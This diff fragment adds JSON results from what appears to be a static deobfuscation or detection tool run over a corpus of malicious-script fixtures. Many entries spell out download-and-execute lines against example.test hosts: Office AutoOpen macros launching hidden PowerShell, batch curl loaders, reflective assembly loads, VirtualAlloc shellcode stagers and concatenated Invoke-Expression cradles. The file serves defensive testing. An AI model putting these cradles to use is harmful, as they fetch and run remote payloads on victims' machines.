+      "fixture_id": "corpus_octal_ascii_002",
+      "implementation": "reference",
+      "latency_ms": 0.00346300657838583,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 37,
+      "final_sha256": "081d6e2416f8900ce2e46e33da3abbab39ace194799421087745500541833942",
+      "final_text": "\\143\\155\\144\\40\\57\\143\\40\\144\\151\\162",
+      "fixture_id": "corpus_octal_ascii_003",
+      "implementation": "reference",
+      "latency_ms": 0.0026599736884236336,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 43,
+      "final_sha256": "f3476feb929f6527ed195f23a0688e3887e4349a650ea5c5e1ccb1758240d998",
+      "final_text": "\\107\\145\\164\\55\\120\\162\\157\\143\\145\\163\\163",
+      "fixture_id": "corpus_octal_ascii_004",
+      "implementation": "reference",
+      "latency_ms": 0.0030050287023186684,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 62,
+      "final_sha256": "357116046a3f94fb8b97c81f34bb1fe9725bdb263a9c0a69e88bba3be7ffe16f",
+      "final_text": "\\143\\165\\162\\154\\40\\145\\170\\141\\155\\160\\154\\145\\56\\143\\157\\155",
+      "fixture_id": "corpus_octal_ascii_005",
+      "implementation": "reference",
+      "latency_ms": 0.003930006641894579,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 184,
+      "final_sha256": "ecc33432b189dd8ba6ad165051ffb5be0e2c2d091c5f2afd4c90d0a495daf0c3",
+      "final_text": "Sub AutoOpen()\n    Dim s As String\n    s = \"powershell -w hidden -c iwr 'http://ofc-1.example.test/doc-loader.exe' -o $env:TEMP\\p.exe;start $env:TEMP\\p.exe\"\n    Shell s, vbHide\nEnd Sub",
+      "fixture_id": "corpus_office_macro_001",
+      "implementation": "reference",
+      "latency_ms": 0.016484991647303104,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 185,
+      "final_sha256": "46c0c5dee1118b3f704199e5c9626be29db696ec2f7fc6d096fb3b653efe514d",
+      "final_text": "Sub AutoOpen()\n    Dim s As String\n    s = \"powershell -w hidden -c iwr 'http://ofc-2.example.test/inv-payload.exe' -o $env:TEMP\\p.exe;start $env:TEMP\\p.exe\"\n    Shell s, vbHide\nEnd Sub",
+      "fixture_id": "corpus_office_macro_002",
+      "implementation": "reference",
+      "latency_ms": 0.01631001941859722,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 185,
+      "final_sha256": "f5da0fd35a7c2899529cdf435c80534dea849a8b7656d61f775c36092e40bf08",
+      "final_text": "Sub AutoOpen()\n    Dim s As String\n    s = \"powershell -w hidden -c iwr 'http://ofc-3.example.test/report-drop.exe' -o $env:TEMP\\p.exe;start $env:TEMP\\p.exe\"\n    Shell s, vbHide\nEnd Sub",
+      "fixture_id": "corpus_office_macro_003",
+      "implementation": "reference",
+      "latency_ms": 0.016229983884841204,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 183,
+      "final_sha256": "febbd90fb63254f56519192b5bba8877d6b7b7c8405753846a2b47f6043a69d0",
+      "final_text": "Sub AutoOpen()\n    Dim s As String\n    s = \"powershell -w hidden -c iwr 'http://ofc-4.example.test/quote-run.exe' -o $env:TEMP\\p.exe;start $env:TEMP\\p.exe\"\n    Shell s, vbHide\nEnd Sub",
+      "fixture_id": "corpus_office_macro_004",
+      "implementation": "reference",
+      "latency_ms": 0.01642701681703329,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 183,
+      "final_sha256": "a48c40ee0563d2d0adeb81c89028e2f26567e29de0575ec196a12b0eb05f5ff2",
+      "final_text": "Sub AutoOpen()\n    Dim s As String\n    s = \"powershell -w hidden -c iwr 'http://ofc-5.example.test/statement.exe' -o $env:TEMP\\p.exe;start $env:TEMP\\p.exe\"\n    Shell s, vbHide\nEnd Sub",
+      "fixture_id": "corpus_office_macro_005",
+      "implementation": "reference",
+      "latency_ms": 0.015465018805116415,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 86,
+      "final_sha256": "25e698285a12c13b1062950ec2c0f1bd6b2b1b3df5718f99794b1e08bc0bd0ad",
+      "final_text": "@echo off\ncurl -o %TEMP%\\o.bat http://one-1.example.test/loader.bat\nstart %TEMP%\\o.bat",
+      "fixture_id": "corpus_onenote_embed_001",
+      "implementation": "reference",
+      "latency_ms": 0.006126996595412493,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 81,
+      "final_sha256": "0cd7861b4f23906a032d0d54039a5fd67ea16e6fbb8491321f9372d9dfbf2dbc",
+      "final_text": "@echo off\ncurl -o %TEMP%\\o.bat http://one-2.example.test/x.bat\nstart %TEMP%\\o.bat",
+      "fixture_id": "corpus_onenote_embed_002",
+      "implementation": "reference",
+      "latency_ms": 0.005619018338620663,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 87,
+      "final_sha256": "fae5d175e06e8b8e4ec9f1648a4846de3f72a8ea6ef681a12d2969866c60a4a5",
+      "final_text": "@echo off\ncurl -o %TEMP%\\o.bat http://one-3.example.test/dropper.cmd\nstart %TEMP%\\o.bat",
+      "fixture_id": "corpus_onenote_embed_003",
+      "implementation": "reference",
+      "latency_ms": 0.005465000867843628,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 84,
+      "final_sha256": "40323866baf9c1f6ab73a0e67f10a3fec2cd91595aa1a3d24612950cf4187ece",
+      "final_text": "@echo off\ncurl -o %TEMP%\\o.bat http://one-4.example.test/init.cmd\nstart %TEMP%\\o.bat",
+      "fixture_id": "corpus_onenote_embed_004",
+      "implementation": "reference",
+      "latency_ms": 0.0054390402510762215,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 84,
+      "final_sha256": "ef5d9a51a5372ac5a94f0cb497a2ab1a00d3ad47b0589a930cfc83002955a352",
+      "final_text": "@echo off\ncurl -o %TEMP%\\o.bat http://one-5.example.test/next.cmd\nstart %TEMP%\\o.bat",
+      "fixture_id": "corpus_onenote_embed_005",
+      "implementation": "reference",
+      "latency_ms": 0.005069014150649309,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 116,
+      "final_sha256": "1ae58f0320f19ca6b2b15a0b9eb0537c564c5e390e5845f42ebbf065530e4d23",
+      "final_text": "# RC4-encoded payload with hardcoded key: 'hardcoded-rc4-key-1'\n# recovered plaintext: 'http://rc4-1.example.test/x'",
+      "fixture_id": "corpus_rc4_analyst_001",
+      "implementation": "reference",
+      "latency_ms": 0.007561000529676676,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 116,
+      "final_sha256": "515e18c656dc4ce64c6415a2c82f5b6d4c487f48121cc50fd5c1bfb52380c0ab",
+      "final_text": "# RC4-encoded payload with hardcoded key: 'hardcoded-rc4-key-2'\n# recovered plaintext: 'http://rc4-2.example.test/y'",
+      "fixture_id": "corpus_rc4_analyst_002",
+      "implementation": "reference",
+      "latency_ms": 0.007542956154793501,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 116,
+      "final_sha256": "c2be63dd5aa2b8cecdce078072ab60853c3db62821749dd45e9b8f48d267cc16",
+      "final_text": "# RC4-encoded payload with hardcoded key: 'hardcoded-rc4-key-3'\n# recovered plaintext: 'http://rc4-3.example.test/z'",
+      "fixture_id": "corpus_rc4_analyst_003",
+      "implementation": "reference",
+      "latency_ms": 0.0074319541454315186,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 116,
+      "final_sha256": "110af151e206027ad8c2204c7487c3315b1d05daf27de7ccfcacadf4124f9290",
+      "final_text": "# RC4-encoded payload with hardcoded key: 'hardcoded-rc4-key-4'\n# recovered plaintext: 'http://rc4-4.example.test/a'",
+      "fixture_id": "corpus_rc4_analyst_004",
+      "implementation": "reference",
+      "latency_ms": 0.007485970854759216,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 116,
+      "final_sha256": "2c6a7deea825656adae35f86c0407316ff3df1ea4244efbd8071131f77cf2780",
+      "final_text": "# RC4-encoded payload with hardcoded key: 'hardcoded-rc4-key-5'\n# recovered plaintext: 'http://rc4-5.example.test/b'",
+      "fixture_id": "corpus_rc4_analyst_005",
+      "implementation": "reference",
+      "latency_ms": 0.007206981536000967,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 151,
+      "final_sha256": "16efa0ef798503bde30f53914ed9c16a346d0ef4ba72631c5b1837e27b3906a4",
+      "final_text": "$b=(New-Object Net.WebClient).DownloadData('http://refl-1.example.test/asm.bin'); [System.Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,$null)",
+      "fixture_id": "corpus_reflection_assembly_load_001",
+      "implementation": "reference",
+      "latency_ms": 0.009594019502401352,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 151,
+      "final_sha256": "3eaaaefd75012a9dba210f64b80915ad08706c3781fbef0faa686fe7e18ceaa8",
+      "final_text": "$b=(New-Object Net.WebClient).DownloadData('http://refl-2.example.test/asm.bin'); [System.Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,$null)",
+      "fixture_id": "corpus_reflection_assembly_load_002",
+      "implementation": "reference",
+      "latency_ms": 0.009850016795098782,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 151,
+      "final_sha256": "3b24959b25f516e641618b7ee4c6a0c3d70c2a28fe66fd285149ad7504a6f368",
+      "final_text": "$b=(New-Object Net.WebClient).DownloadData('http://refl-3.example.test/asm.bin'); [System.Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,$null)",
+      "fixture_id": "corpus_reflection_assembly_load_003",
+      "implementation": "reference",
+      "latency_ms": 0.009587034583091736,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 151,
+      "final_sha256": "846a574573d5accf2135caba5063f4f2cacf15ddb801cd2a7a7fd003e2740333",
+      "final_text": "$b=(New-Object Net.WebClient).DownloadData('http://refl-4.example.test/asm.bin'); [System.Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,$null)",
+      "fixture_id": "corpus_reflection_assembly_load_004",
+      "implementation": "reference",
+      "latency_ms": 0.009269977454096079,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 151,
+      "final_sha256": "25b28635ff6103bbb9dd364ad8b5f42c0e756729d5bd7b1ba8c530abd69cf5d9",
+      "final_text": "$b=(New-Object Net.WebClient).DownloadData('http://refl-5.example.test/asm.bin'); [System.Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,$null)",
+      "fixture_id": "corpus_reflection_assembly_load_005",
+      "implementation": "reference",
+      "latency_ms": 0.009391049388796091,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 36,
+      "final_sha256": "ffc778956ac757412f07b2fbbcafea695ccea3a5772744aefbd5b19a4122ba46",
+      "final_text": "-join ('noisserpxE-ekovnI'[-1..-17])",
+      "fixture_id": "corpus_reverse_strings_001",
+      "implementation": "reference",
+      "latency_ms": 0.0026589841581881046,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 33,
+      "final_sha256": "bc75da687ca67c0e33956b5226265afec0a9d9188d4e2110538e005fae3956fd",
+      "final_text": "-join ('gnirtSdaolnwoD'[-1..-14])",
+      "fixture_id": "corpus_reverse_strings_002",
+      "implementation": "reference",
+      "latency_ms": 0.002442975528538227,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 21,
+      "final_sha256": "6c9df618908a8562e7894389a99e934c6db78753ec30090daafab16eaef7c535",
+      "final_text": "-join ('XEI'[-1..-3])",
+      "fixture_id": "corpus_reverse_strings_003",
+      "implementation": "reference",
+      "latency_ms": 0.0020490260794758797,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 26,
+      "final_sha256": "4a631504b22f7dab1a4b4361716c54f4c0ae4be25a05fb31a9ecb82faef1617a",
+      "final_text": "-join ('litutrec'[-1..-8])",
+      "fixture_id": "corpus_reverse_strings_004",
+      "implementation": "reference",
+      "latency_ms": 0.0025090412236750126,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 27,
+      "final_sha256": "7788cc7ce75866abccf4380c9e1bd7e473072e968783badfb75e414d36d24bc4",
+      "final_text": "-join ('nimdastib'[-1..-9])",
+      "fixture_id": "corpus_reverse_strings_005",
+      "implementation": "reference",
+      "latency_ms": 0.0027909991331398487,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 28,
+      "final_sha256": "1e8740aa474b17f7bb4911216b49345f1cabfb760f78c554da68009df04f1524",
+      "final_text": "Uryyb, guvf vf n oravta grfg",
+      "fixture_id": "corpus_rot13_001",
+      "implementation": "reference",
+      "latency_ms": 0.002670974936336279,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 32,
+      "final_sha256": "5724c2a630d2e11f207d2279b9611840e9fb86443984f659dc573269e4cc3c2f",
+      "final_text": "Vaibxr-Rkcerffvba 'fnsr cnlybnq'",
+      "fixture_id": "corpus_rot13_002",
+      "implementation": "reference",
+      "latency_ms": 0.002662010956555605,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 18,
+      "final_sha256": "409828c6bc1a25a424f58ac4f1b860d842b3079aa5d6aa0e422847c7979c4ef7",
+      "final_text": "vq;jubnzv;ubfganzr",
+      "fixture_id": "corpus_rot13_003",
+      "implementation": "reference",
+      "latency_ms": 0.002127024345099926,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 30,
+      "final_sha256": "c91275def676e6375aedb17540a17e111eb3855e06e5c0ca197947dedb22bcda",
+      "final_text": "phey uggc://ebg-rknzcyr.grfg/k",
+      "fixture_id": "corpus_rot13_004",
+      "implementation": "reference",
+      "latency_ms": 0.002603977918624878,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 37,
+      "final_sha256": "a4151edc4622a1881772354d2211eff2c4f3a48349a719353d432ffbcac0c9e2",
+      "final_text": "VRK 'PyvpxSvk snxr PNCGPUN pbclcnfgr'",
+      "fixture_id": "corpus_rot13_005",
+      "implementation": "reference",
+      "latency_ms": 0.0029259826987981796,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 252,
+      "final_sha256": "7f54907b9e07f3f001498276e6331863da8927d292d093cee702a550b9735a54",
+      "final_text": "# stager fetch: http://sc-1.example.test/beacon\n$b=[System.Convert]::FromBase64String($enc); $p=[Kernel32]::VirtualAlloc(0,$b.Length,0x3000,0x40); [System.Runtime.InteropServices.Marshal]::Copy($b,0,$p,$b.Length); [Kernel32]::CreateThread(0,0,$p,0,0,0)",
+      "fixture_id": "corpus_shellcode_virtualalloc_001",
+      "implementation": "reference",
+      "latency_ms": 0.018019985873252153,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 252,
+      "final_sha256": "4b13f0c7cd7f95303e3f46adc1f24e654d82a0e87373a0b3f9ff7a3148bdca13",
+      "final_text": "# stager fetch: http://sc-2.example.test/beacon\n$b=[System.Convert]::FromBase64String($enc); $p=[Kernel32]::VirtualAlloc(0,$b.Length,0x3000,0x40); [System.Runtime.InteropServices.Marshal]::Copy($b,0,$p,$b.Length); [Kernel32]::CreateThread(0,0,$p,0,0,0)",
+      "fixture_id": "corpus_shellcode_virtualalloc_002",
+      "implementation": "reference",
+      "latency_ms": 0.016757985576987267,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 252,
+      "final_sha256": "a7989b6f55d0267221e8d3750c55402eb79c337d88626b134e05a3999e46efe0",
+      "final_text": "# stager fetch: http://sc-3.example.test/beacon\n$b=[System.Convert]::FromBase64String($enc); $p=[Kernel32]::VirtualAlloc(0,$b.Length,0x3000,0x40); [System.Runtime.InteropServices.Marshal]::Copy($b,0,$p,$b.Length); [Kernel32]::CreateThread(0,0,$p,0,0,0)",
+      "fixture_id": "corpus_shellcode_virtualalloc_003",
+      "implementation": "reference",
+      "latency_ms": 0.016395992133766413,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 252,
+      "final_sha256": "d8a02562e1a921aa137c054ebac94c126f67a7cde39b9ff125ce30cad5ab1c40",
+      "final_text": "# stager fetch: http://sc-4.example.test/beacon\n$b=[System.Convert]::FromBase64String($enc); $p=[Kernel32]::VirtualAlloc(0,$b.Length,0x3000,0x40); [System.Runtime.InteropServices.Marshal]::Copy($b,0,$p,$b.Length); [Kernel32]::CreateThread(0,0,$p,0,0,0)",
+      "fixture_id": "corpus_shellcode_virtualalloc_004",
+      "implementation": "reference",
+      "latency_ms": 0.015858036931604147,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 252,
+      "final_sha256": "0ccb8a74ad67eacc5a9953ba14d05cd64dbd0ceca1aca7cd4bf74642aa63fe9f",
+      "final_text": "# stager fetch: http://sc-5.example.test/beacon\n$b=[System.Convert]::FromBase64String($enc); $p=[Kernel32]::VirtualAlloc(0,$b.Length,0x3000,0x40); [System.Runtime.InteropServices.Marshal]::Copy($b,0,$p,$b.Length); [Kernel32]::CreateThread(0,0,$p,0,0,0)",
+      "fixture_id": "corpus_shellcode_virtualalloc_005",
+      "implementation": "reference",
+      "latency_ms": 0.016084988601505756,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 118,
+      "final_sha256": "be03364c3791ef78839ebd11bed6e0982dd9e772e4b658ee0fb38055a8042c1c",
+      "final_text": "$c=('Inv'+'oke'+'-Ex'+'pression'); & $c ((New-Object Net.WebClient).DownloadString('http://con-1.example.test/l.ps1'))",
+      "fixture_id": "corpus_string_concat_iex_001",
+      "implementation": "reference",
+      "latency_ms": 0.007645983714610338,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 118,
+      "final_sha256": "21986470d0fd9b1e7c56f345d76928ccf1beb1cf4158b264ca28e7a3881aaa9b",
+      "final_text": "$c=('Inv'+'oke'+'-Ex'+'pression'); & $c ((New-Object Net.WebClient).DownloadString('http://con-2.example.test/l.ps1'))",
+      "fixture_id": "corpus_string_concat_iex_002",
+      "implementation": "reference",
+      "latency_ms": 0.007618975359946489,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 118,
+      "final_sha256": "163471294fa3b4e688ee6df265667c390655344d753e3dadd7749ef9e400a8f9",
+      "final_text": "$c=('Inv'+'oke'+'-Ex'+'pression'); & $c ((New-Object Net.WebClient).DownloadString('http://con-3.example.test/l.ps1'))",
+      "fixture_id": "corpus_string_concat_iex_003",
+      "implementation": "reference",
+      "latency_ms": 0.007605005521327257,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 118,
+      "final_sha256": "6e59fe741ce48a37516e57046664ebcfc265b39b7cef7da49a15d3deb7545ece",
+      "final_text": "$c=('Inv'+'oke'+'-Ex'+'pression'); & $c ((New-Object Net.WebClient).DownloadString('http://con-4.example.test/l.ps1'))",
+      "fixture_id": "corpus_string_concat_iex_004",
+      "implementation": "reference",
+      "latency_ms": 0.007550988811999559,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 118,
+      "final_sha256": "5f2288eb4f7081da6d0527554b94db45dda836a567530be9b59ad6b56f9bd442",
+      "final_text": "$c=('Inv'+'oke'+'-Ex'+'pression'); & $c ((New-Object Net.WebClient).DownloadString('http://con-5.example.test/l.ps1'))",
+      "fixture_id": "corpus_string_concat_iex_005",
+      "implementation": "reference",
+      "latency_ms": 0.007405003998428583,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 44,
+      "final_sha256": "75727251fb9cb44f8c0e84c87b2ea1138802fdfde29355ac1b569dc69b7376f7",
+      "final_text": "WVZkUk4yUXlhSFpaVnpGd1R6Sm9kbU16VW5WWlZ6RnM=",
+      "fixture_id": "corpus_triple_base64_001",
+      "implementation": "reference",
+      "latency_ms": 0.003202003426849842,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 80,
+      "final_sha256": "29a65b56270b753f8b7f31312d9fa14fa2c7ba54215cd01929fdfb6b9506a749",
+      "final_text": "V1ROV2VXSkRRbTlrU0ZKM1QyazRkbVJJU25CTVZFVjFXbGhvYUdKWVFuTmFVelV3V2xoT01Fd3paejA9",
+      "fixture_id": "corpus_triple_base64_002",
+      "implementation": "reference",
+      "latency_ms": 0.00520399771630764,
+      "layer_count": 0,
